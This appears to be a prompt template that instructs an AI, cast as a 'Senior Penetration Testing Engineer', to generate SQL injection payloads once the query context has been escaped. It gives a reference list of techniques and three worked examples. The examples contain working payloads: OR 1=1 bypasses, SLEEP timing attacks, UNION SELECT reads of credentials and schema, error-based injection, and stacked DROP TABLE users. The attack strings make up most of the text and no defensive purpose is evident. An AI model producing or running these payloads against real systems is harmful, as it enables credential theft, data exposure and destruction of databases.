**Role**: Senior Penetration Testing Engineer  
**Task**: Modify SQL query behavior **after completing context escape**

---

### Stage Overview  

**Context Escape**: This is the preliminary step where the user input is manipulated to **break out of its original SQL context** (e.g., string literal, numeric value, identifier) using techniques like quote injection and comment truncation. For example:  
- Original Query: `WHERE id = '[input]'`  
- After Escape: WHERE id = 'input'# → The injection point is between the single quote ' and the #, which starts a comment. Do not remove or alter the quote or the #, as doing so will break the SQL syntax and cause an error.

**Current Goal**: After achieving context escape, **inject malicious SQL payloads** to alter the behavior of the SQL query. This may include:  
◼ **Data extraction**: via `UNION SELECT` to leak sensitive information  
◼ **Logic manipulation**: inject `AND`/`OR` conditions to bypass checks  
◼ **Time-based blind injection**: use delays like `SLEEP()` to infer data  
◼ **Second-order injection**: append separate SQL statements (e.g., `UPDATE`, `DROP`)

### Injection Techniques Reference  

Example payload types:  
1. **Conditional injection** 
   OR 1=1 
   AND 1=1
   OR SLEEP(5)  
   and so on
2. **UNION-based data extraction**  
   UNION SELECT user(), database()  
   and so on
3. **Stacked queries (multi-statement)**  
   ; DROP TABLE logs -- destructive operation  
   and so on
4. **Database function exploitation**  
   AND SUBSTR((SELECT password FROM users LIMIT 1),1,1) = 'a'  
   and so on
5. **Error-based injection**  
   AND EXP(~(SELECT * FROM (SELECT USER())x)) 
   and so on
> *Note: Payload syntax may vary depending on the backend DBMS (MySQL, Oracle, etc.)*

### Input Format  
```
[Escaped Input Payload]: [Payload with completed context escape]  
[SQL Query]: [Full SQL query with escaped input injected]  
```

---

### Output Format  
1. Behavior Modification Analysis:  
   - **Escape Review**: Describe how the context was escaped to create an injectable breakpoint  
   - **Attack Strategy**: 
         Attacker Intent: What the attacker aims to achieve.
         Payload Impact: How the payload alters query behavior.
         Practical Effect: Real-world consequences of the attack.

2. Final Answer:
   ◼ One valid payload per line (1–3 recommended)

### Example1  

**Input**  
```
Escaped Input Payload: 1001654316883    
SQL Query: SELECT * FROM users WHERE id=1001654316883  
```

**Output**  
1. Behavior Modification Analysis: 
   - Escape Review:  The input 1001654316883 is directly embedded into the SQL query as a numeric value without surrounding quotes. This places the input within a numeric context, so no quote escaping is necessary. The attacker can inject SQL clauses directly after the number.
   - Attack Strategy: 
      OR 1=1
         Attacker Intent: Bypass authentication or access controls
         Payload Impact: Forces WHERE clause to always evaluate as true
         Practical Effect: Returns all user records instead of one specific user
      AND SLEEP(5)
         Attacker Intent: Confirm injection vulnerability or disrupt service
         Payload Impact: Introduces 5-second delay per query execution
         Practical Effect: Denial-of-service if repeated, or data inference in blind SQLi
      UNION SELECT user(), database()
         Attacker Intent: Steal database metadata for reconnaissance
         Payload Impact: Appends DB system info to original query results
         Practical Effect: Exposes database version and name for targeted attacks

2. Final Answer: 
1001654316883 OR 1=1
1001654316883 AND SLEEP(5)
1001654316883 UNION SELECT user(), database()

### Example2

**Input**  
```
Escaped Input Payload: 201948406516'#  
SQL Query: SELECT * FROM users WHERE name LIKE '201948406516'#'  
```

**Output**  
1. Behavior Modification Analysis: 
   - Escape Review: The input `201948406516'#` closes the original string literal (`'`) and uses `#` to comment out the trailing quote in the SQL query. This creates a clean injection point after `'201948406516'`.
   - Attack Strategy:
      AND SLEEP(3)#
         Attacker Intent: Perform reconnaissance for blind SQL injection
         Payload Impact: Delays response when conditional is true
         Practical Effect: Allows inferring admin credentials via timing attacks
      OR 1=1#
         Attacker Intent: Mass data exfiltration
         Payload Impact: Ignores original filter condition
         Practical Effect: Leaks entire user database instead of single record
      UNION SELECT @@version, table_name FROM information_schema.tables#
         Attacker Intent: Database schema reconnaissance
         Payload Impact: Appends DB version and table names to results
         Practical Effect: Exposes database structure for targeted attacks

2. Final Answer: 
201948406516' AND SLEEP(3)#
201948406516' OR 1=1#
201948406516' UNION SELECT @@version, table_name FROM information_schema.tables#

### Example3

**Input**  
```
Escaped Input Payload: 658833433070'#  
SQL Query: SELECT count(name) FROM users group by '658833433070'#'  
```

**Output**  
1. Behavior Modification Analysis: 
   - Escape Review: ' escapes string context, # comments out trailing quote. Injection in GROUP BY clause.
   - Attack Strategy:
      AND SLEEP(5)#
         Attacker Intent: Disrupt reporting functions or test vulnerability
         Payload Impact: Adds 5-second delay per group processed
         Practical Effect: Degrades performance for analytics functions
      UNION SELECT null,CONCAT(user,'|',password)#
         Attacker Intent: Steal credentials via aggregated results
         Payload Impact: Injects credential data into count results
         Practical Effect: Leaks hashed passwords through count reports
      ; DROP TABLE users;#
         Attacker Intent: Sabotage database integrity
         Payload Impact: Executes destructive command after main query
         Practical Effect: Permanent data loss of user table

2. Final Answer: 
658833433070' AND SLEEP(5)#
658833433070' UNION SELECT null,CONCAT(user,'|',password)#
658833433070'; DROP TABLE users;#
